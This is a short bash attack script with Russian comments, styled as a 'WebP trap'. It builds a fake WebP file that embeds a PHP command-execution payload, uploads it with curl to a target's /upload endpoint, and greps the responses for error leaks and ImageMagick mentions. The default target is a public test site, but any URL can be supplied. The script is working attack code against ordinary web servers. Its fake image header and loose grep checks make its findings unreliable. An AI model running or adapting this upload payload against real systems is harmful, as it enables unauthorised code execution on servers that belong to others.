#!/bin/bash
# ╔══════════════════════════════════════════════╗
# ║   🟡 WEBP TRAP — Атака через изображения    ║
# ╚══════════════════════════════════════════════╝
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   🖼️ WEBP TRAP — Атака через WebP           ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Техника: загружаем "заражённое" WebP изображение
# При обработке сервер может выдать ошибку и раскрыть информацию

# Создаём тестовое WebP с вредоносными метаданными
cat > /tmp/webp_trap.webp << 'WEBPDATA'
RIFF....WEBPVP8X....ICCP....EXIF....XMP....<?php system('id'); ?>
WEBPDATA

echo "[WEBP] 🖼️ Загружаю заражённое WebP..."
curl -sk --max-time 5 -F "file=@/tmp/webp_trap.webp;type=image/webp" \
    "$TARGET/upload" \
    -o /tmp/webp_upload_result.txt -w "  HTTP %{http_code}\n" 2>/dev/null

# Проверяем результат
grep -qi "error\|php\|system\|id\|warning" /tmp/webp_upload_result.txt 2>/dev/null && {
    echo "  💀 СЕРВЕР ОБРАБОТАЛ WEBP И ВЫДАЛ ОШИБКУ!"
    grep -oP '(?:error|warning|notice|php)[^<]{0,100}' /tmp/webp_upload_result.txt 2>/dev/null | head -5
}

# Проверяем есть ли ImageMagick/GraphicsMagick
curl -sk --max-time 3 "$TARGET" -o /tmp/webp_site.html 2>/dev/null
grep -qi "imagemagick\|graphicsmagick\|libwebp" /tmp/webp_site.html 2>/dev/null && echo "  💀 ImageMagick обнаружен! WebP уязвимость актуальна."

echo "[WEBP] ✅ Атака завершена"
